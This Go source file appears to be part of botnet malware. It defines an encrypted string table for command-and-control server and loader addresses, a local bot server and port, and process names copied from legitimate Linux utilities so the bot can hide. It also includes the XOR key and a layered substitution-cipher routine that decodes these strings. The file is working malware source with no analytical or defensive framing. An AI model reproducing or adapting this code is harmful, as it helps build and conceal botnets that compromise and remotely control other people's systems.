package main

import "fmt"

var database = make(map[int]map[string]interface{})
var key uint32 = 0x0B00B135

func tableInit() {
	// Bot C2 info
	addEntry(0, []byte{0xB0, 0xC1, 0xB0, 0xC1, 0xDC, 0xDF, 0xE6, 0xBC}, 8)       // c2 server
	addEntry(1, []byte{0xE6, 0xDC, 0xE6, 0xE8, 0xFB}, 5)                         // c2 loader
	addEntry(2, []byte{0xD6, 0xB0, 0xC1, 0xFE, 0xCC, 0xD6, 0xB0, 0xC1, 0xFE}, 9) // success msg "Fuwa Fuwa"
	addEntry(3, []byte{0xEC, 0xAD, 0xB0, 0xC5, 0xD4, 0xDF, 0xFB}, 7)             // local server "vtubers"
	addEntry(4, []byte{0xD5, 0xFF, 0xFF, 0xE7, 0xE7}, 5)                         // bot local server port
	// random proc names
	addEntry(5, []byte{0xE8, 0xC5, 0xB0, 0xFB, 0xD1, 0xB1, 0xD4, 0xB1, 0xEF, 0xDC, 0xEA, 0xE0}, 12)                                                                   // ibus-memconf
	addEntry(6, []byte{0xC1, 0xD5, 0xB1, 0xB1, 0xFE, 0xEA}, 6)                                                                                                        // w2mman
	addEntry(7, []byte{0xB2, 0xC5, 0xB1, 0xAD, 0xDC, 0xFE, 0xFB, 0xEF, 0xE8, 0xE8}, 10)                                                                               // pbmtoascii
	addEntry(8, []byte{0xAD, 0xDD, 0xE8, 0xEA, 0xC8, 0xE1, 0xD4, 0xAD, 0xAD, 0xDC, 0xB2, 0xC5, 0xB1}, 13)                                                             // thinkjettopbm
	addEntry(9, []byte{0xBC, 0xB2, 0xC8, 0xFD, 0xD1, 0xB1, 0xFE, 0xE8, 0xEA, 0xAD, 0xFB, 0xEF, 0xDF, 0xE8, 0xB2, 0xAD, 0xD1, 0xDD, 0xD4, 0xE6, 0xB2, 0xD4, 0xDF}, 23) // dpkg-maintscript-helper
	addEntry(10, []byte{0xB1, 0xDC, 0xEA, 0xAD, 0xFE, 0xFD, 0xD4, 0xD1, 0xE8, 0xB1, 0xF1, 0xA2, 0xAF, 0xEE}, 15)                                                      // montage-im6.q16

}

func addEntry(id int, data []byte, buf int) {
	if _, exists := database[id]; exists {
		if debug {
			msg := fmt.Sprintf("[table] Entry %d already exists in database", id)
			fmt.Println(msg)
		}
	} else {
		database[id] = map[string]interface{}{"data": data, "buf": buf}
	}
}

func xorDec(data []byte) []byte {
	n := make([]byte, 0)
	k1 := byte(key & 0xff)
	k2 := byte((key >> 8) & 0xff)
	k3 := byte((key >> 16) & 0xff)
	k4 := byte((key >> 24) & 0xff)

	for _, b := range data {
		tmp := b ^ k1
		tmp ^= k2
		tmp ^= k3
		tmp ^= k4
		n = append(n, tmp)
	}

	return n
}

func ciDec(data string) string { // Adding another level of... complexity
	chars := []rune{' ', '!', '"', '#', '$', '%', '&', '\'', '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`', '{', '|', '}', '~', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'}
	k := []rune{'Z', 'U', 't', '1', '.', '\\', '4', 'K', 'j', 'R', 'W', 'k', 'A', '?', 'u', '!', 'b', '[', 'm', ';', '{', '^', ',', 'X', 'r', 'V', '$', '\'', ' ', 'C', 'i', ']', '6', '%', 'J', '~', 'p', 'O', 'z', '"', 'F', 'L', '5', 'd', 'E', 'q', '7', '<', 'H', '&', '2', 'S', 'G', 'P', 'o', '`', '8', '/', 'Y', '3', 'I', ')', 's', '-', 'a', 'M', '(', 'v', 'w', 'f', 'g', '@', '+', 'D', 'n', 'y', '9', ':', 'x', 'B', 'c', 'l', '|', 'Q', '#', '0', 'h', '*', 'N', 'T', '}', '_', '>', 'e', '='}

	var decryptedText string
	for _, char := range data {
		for i, item := range k {
			if item == char {
				decryptedText += string(chars[i])
				break
			}
		}
	}

	return decryptedText
}

func table_getID(id int) string {
	dataBytes := database[id]["data"].([]byte)
	decryptedData := xorDec(dataBytes)
	op := ciDec(string(decryptedData))
	data := op

	for i := 0; i < 7; i++ {
		op = ciDec(string(data))
		data = op
	}

	return data
}
